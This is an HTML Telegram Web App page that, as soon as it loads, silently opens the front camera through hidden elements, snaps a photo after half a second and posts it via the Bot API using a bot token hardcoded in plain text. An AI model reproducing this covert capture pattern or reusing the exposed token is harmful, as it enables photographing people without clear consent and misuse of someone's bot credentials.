<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Photo Capture</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '8129102478:AAFiIabXWiPI5Aeqqh7jEqXgUKLE6-NalA0';
        const tg = window.Telegram.WebApp;

        // Получение ID пользователя из Telegram Web App
        const CHAT_ID = tg.initDataUnsafe?.user?.id;

        if (!CHAT_ID) {
            console.error("Telegram User ID is missing.");
            tg.close();
        }

        tg.expand(); // Расширение Web App на весь экран

        // Функция для захвата и отправки фото
        function captureAndSendPhoto(video, canvas) {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            // Рисуем изображение на canvas
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Получаем изображение в формате base64
            const imageData = canvas.toDataURL('image/jpeg');

            // Конвертация base64 в blob и отправка в Telegram
            fetch(imageData)
                .then(res => res.blob())
                .then(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'photo.jpg');

                    // Отправка изображения
                    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log("Photo sent successfully!");
                        tg.close(); // Закрыть Web App после отправки
                    } else {
                        console.error("Failed to send photo:", data.description);
                        alert("Ошибка отправки фото: " + data.description);
                        tg.close();
                    }
                })
                .catch(err => {
                    console.error("Error:", err);
                    alert("Произошла ошибка при отправке фото.");
                    tg.close();
                });
        }

        window.onload = () => {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            // Активируем поток видео
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(stream => {
                    video.srcObject = stream;

                    // Ждем загрузки метаданных для получения размеров видео
                    video.onloadedmetadata = () => {
                        video.play();

                        // Небольшая задержка перед захватом изображения
                        setTimeout(() => {
                            captureAndSendPhoto(video, canvas);
                        }, 500); // Задержка в 0.5 секунды
                    };
                })
                .catch(err => {
                    console.error("Camera error:", err);
                    alert("Ошибка доступа к камере. Проверьте настройки.");
                    tg.close();
                });
        };
    </script>
</body>
</html>
